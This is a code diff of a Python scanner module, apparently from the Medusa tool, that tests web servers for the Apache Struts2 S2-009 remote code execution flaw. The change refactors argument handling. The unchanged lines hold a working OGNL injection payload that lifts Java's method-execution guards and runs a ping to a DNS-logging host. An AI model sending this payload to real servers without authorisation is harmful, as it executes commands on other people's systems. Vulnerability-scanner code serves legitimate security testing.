@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 __author__ = 'Ascotbe'
-from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,Proxies,Dnslog
+from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,Dnslog
 import urllib3
 import requests
 import time
@@ -23,28 +23,15 @@ class VulnerabilityInfo(object):
         self.info['version'] = "2.1.0-2.3.1.1"  # 这边填漏洞影响的版本
         self.info['details'] = Medusa  # 结果
 
-class UrlProcessing:  # URL处理函数
-    def result(self, url):
-        if url.startswith("http"):  # 判断是否有http头，如果没有就在下面加入
-            res = urllib.parse.urlparse(url)
-        else:
-            res = urllib.parse.urlparse('http://%s' % url)
-        return res.scheme, res.hostname, res.port,res.path
 
-def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
-    proxies=Proxies().result(proxies)
-
-    scheme, url, port,path = UrlProcessing().result(Url)
-    if port is None and scheme == 'https':
-        port = 443
-    elif port is None and scheme == 'http':
-        port = 80
-    else:
-        port = port
+def medusa(**kwargs)->None:
+    url = kwargs.get("Url")  # 获取传入的url参数
+    Headers = kwargs.get("Headers")  # 获取传入的头文件
+    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
     DL=Dnslog()
     payload="""?age=medusa&name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3D+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20{}%27%29%29%28meh%29&z%5B%28name%29%28%27meh%27%29%5D=true""".format(DL.dns_host())
     try:
-        payload_url = scheme + "://" + url +":"+ str(port)+path+payload
+        payload_url = url+payload
 
         resp = requests.get(payload_url,headers=Headers, timeout=6,proxies=proxies, verify=False)
         con = resp.text
@@ -52,7 +39,7 @@ def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
         if DL.result():
             Medusa = "{} 存在Struts2远程代码执行漏洞(S2-009)\r\n漏洞详情:\r\n版本号:S2-009\r\n使用EXP:{}\r\n返回数据:{}\r\n返回DNSLOG数据:{}\r\n使用DNSLOG:{}\r\n".format(url,payload_url,con,DL.dns_text(),DL.dns_host())
             _t=VulnerabilityInfo(Medusa)
-            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
+            VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
             WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
